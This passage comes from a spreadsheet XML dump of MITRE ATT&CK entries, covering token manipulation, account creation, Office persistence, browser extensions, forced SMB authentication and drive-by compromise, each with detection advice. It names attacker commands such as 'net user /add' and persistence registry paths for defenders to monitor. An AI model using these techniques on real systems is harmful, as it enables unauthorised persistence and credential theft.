While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.</t>
  </si>
  <si>
    <t>If an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the &lt;code&gt;runas&lt;/code&gt; command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)
If an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.
Analysts can also monitor for use of Windows APIs such as &lt;code&gt;CreateProcessWithTokenW&lt;/code&gt; and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.</t>
  </si>
  <si>
    <t>T1134.003</t>
  </si>
  <si>
    <t>Make and Impersonate Token (T1134.003)</t>
  </si>
  <si>
    <t>Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.
This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.</t>
  </si>
  <si>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If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.
Analysts can also monitor for use of Windows APIs such as &lt;code&gt;LogonUser&lt;/code&gt; and &lt;code&gt; SetThreadToken&lt;/code&gt; and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.</t>
  </si>
  <si>
    <t>T1134.004</t>
  </si>
  <si>
    <t>Parent PID Spoofing (T1134.004)</t>
  </si>
  <si>
    <t>Process: OS API Execution, Process: Process Creation, Process: Process Metadata</t>
  </si>
  <si>
    <t>Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the &lt;code&gt;CreateProcess&lt;/code&gt; API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via &lt;code&gt;svchost.exe&lt;/code&gt; or &lt;code&gt;consent.exe&lt;/code&gt;) rather than the current user context.(Citation: Microsoft UAC Nov 2018)
Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be &lt;code&gt;explorer.exe&lt;/code&gt; rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)
Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as &lt;code&gt;lsass.exe&lt;/code&gt;), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)</t>
  </si>
  <si>
    <t>Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)
Monitor and analyze API calls to &lt;code&gt;CreateProcess&lt;/code&gt;/&lt;code&gt;CreateProcessA&lt;/code&gt;, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of &lt;code&gt;CreateProcess&lt;/code&gt;/&lt;code&gt;CreateProcessA&lt;/code&gt; may also be proceeded by a call to &lt;code&gt;UpdateProcThreadAttribute&lt;/code&gt;, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.</t>
  </si>
  <si>
    <t>T1134.005</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Process: OS API Execution, User Account: User Account Metadata</t>
  </si>
  <si>
    <t>Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).
With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).</t>
  </si>
  <si>
    <t>Examine data in user’s SID-History attributes using the PowerShell &lt;code&gt;Get-ADUser&lt;/code&gt; cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)
Monitor for Windows API calls to the &lt;code&gt;DsAddSidHistory&lt;/code&gt; function. (Citation: Microsoft DsAddSidHistory)</t>
  </si>
  <si>
    <t>T1135</t>
  </si>
  <si>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</si>
  <si>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</si>
  <si>
    <t>T1136</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, User Account: User Account Creation</t>
  </si>
  <si>
    <t>Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.
Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.</t>
  </si>
  <si>
    <t>Monitor for processes and command-line parameters associated with account creation, such as &lt;code&gt;net user&lt;/code&gt; or &lt;code&gt;useradd&lt;/code&gt;. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.
Collect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.</t>
  </si>
  <si>
    <t>T1136.001</t>
  </si>
  <si>
    <t>Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. 
For example, with a sufficient level of access, the Windows &lt;code&gt;net user /add&lt;/code&gt; command can be used to create a local account. On macOS systems the &lt;code&gt;dscl -create&lt;/code&gt; command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as &lt;code&gt;username&lt;/code&gt;, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)
Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.</t>
  </si>
  <si>
    <t>Monitor for processes and command-line parameters associated with local account creation, such as &lt;code&gt;net user /add&lt;/code&gt; , &lt;code&gt;useradd&lt;/code&gt; , and &lt;code&gt;dscl -create&lt;/code&gt; . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations.</t>
  </si>
  <si>
    <t>T1136.002</t>
  </si>
  <si>
    <t>Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the &lt;code&gt;net user /add /domain&lt;/code&gt; command can be used to create a domain account.(Citation: Savill 1999)
Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.</t>
  </si>
  <si>
    <t>Monitor for processes and command-line parameters associated with domain account creation, such as &lt;code&gt;net user /add /domain&lt;/code&gt;. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.</t>
  </si>
  <si>
    <t>T1136.003</t>
  </si>
  <si>
    <t>Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)
In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)
Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.
Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).</t>
  </si>
  <si>
    <t>Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.</t>
  </si>
  <si>
    <t>T1137</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.
A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)</t>
  </si>
  <si>
    <t>Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.
Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)
Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)</t>
  </si>
  <si>
    <t>T1137.001</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)
Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) 
Word Normal.dotm location:&lt;br&gt;
&lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm&lt;/code&gt;
Excel Personal.xlsb location:&lt;br&gt;
&lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB&lt;/code&gt;
Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under &lt;code&gt;C:\Program Files (x86)\Microsoft Office\root\Office16\&lt;/code&gt;, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) 
An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.</t>
  </si>
  <si>
    <t>Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)</t>
  </si>
  <si>
    <t>T1137.002</t>
  </si>
  <si>
    <t>Office Test (T1137.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)
There exist user and global Registry keys for the Office Test feature, such as:
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf&lt;/code&gt;
* &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf&lt;/code&gt;
Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.</t>
  </si>
  <si>
    <t>Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)
Consider monitoring Office processes for anomalous DLL loads.</t>
  </si>
  <si>
    <t>T1137.003</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)
Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)</t>
  </si>
  <si>
    <t>Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)
Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.</t>
  </si>
  <si>
    <t>T1137.004</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)
Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)
</t>
  </si>
  <si>
    <t>T1137.005</t>
  </si>
  <si>
    <t>Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)
Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)</t>
  </si>
  <si>
    <t>Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) This PowerShell script is ineffective in gathering rules with modified `PRPR_RULE_MSG_NAME` and `PR_RULE_MSG_PROVIDER` properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)
Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.</t>
  </si>
  <si>
    <t>T1137.006</t>
  </si>
  <si>
    <t>Add-ins (T1137.006)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)
Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. </t>
  </si>
  <si>
    <t>Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)
Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior</t>
  </si>
  <si>
    <t>T1140</t>
  </si>
  <si>
    <t>File: File Modification, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.
One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows &lt;code&gt;copy /b&lt;/code&gt; command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)
Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)</t>
  </si>
  <si>
    <t>Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).
Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.</t>
  </si>
  <si>
    <t>T1176</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation, Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)
Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.
Previous to macOS 11, adversaries could silently install browser extensions via the command line using the &lt;code&gt;profiles&lt;/code&gt; tool to install malicious &lt;code&gt;.mobileconfig&lt;/code&gt; files. In macOS 11+, the use of the &lt;code&gt;profiles&lt;/code&gt; tool can no longer install configuration profiles, however &lt;code&gt;.mobileconfig&lt;/code&gt; files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)
Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)
There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek) </t>
  </si>
  <si>
    <t>Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.
Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.
On macOS, monitor the command line for usage of the profiles tool, such as &lt;code&gt;profiles install -type=configuration&lt;/code&gt;. Additionally, all installed extensions maintain a &lt;code&gt;plist&lt;/code&gt; file in the &lt;code&gt;/Library/Managed Preferences/username/&lt;/code&gt; directory. Ensure all listed files are in alignment with approved extensions.(Citation: xorrior chrome extensions macOS)</t>
  </si>
  <si>
    <t>T1185</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Process: Process Access, Process: Process Modification</t>
  </si>
  <si>
    <t>Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)
A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as &lt;code&gt;SeDebugPrivilege&lt;/code&gt; and/or high-integrity/administrator rights.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</si>
  <si>
    <t>This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. New processes may not be created and no additional software dropped to disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for [Process Injection](https://attack.mitre.org/techniques/T1055) against browser applications.</t>
  </si>
  <si>
    <t>T1187</t>
  </si>
  <si>
    <t>File: File Access, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.
The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.
Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)
Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)
There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:
* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to &lt;code&gt;file[:]//[remote address]/Normal.dotm&lt;/code&gt; to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as &lt;code&gt;\\[remote address]\pic.png&lt;/code&gt; that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)</t>
  </si>
  <si>
    <t>Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.
Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)</t>
  </si>
  <si>
    <t>T1189</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation</t>
  </si>
  <si>
    <t>Identity Provider, Linux, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).
Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:
* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting
* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary
* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).
Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)
Typical drive-by compromise process:
1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.
Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.
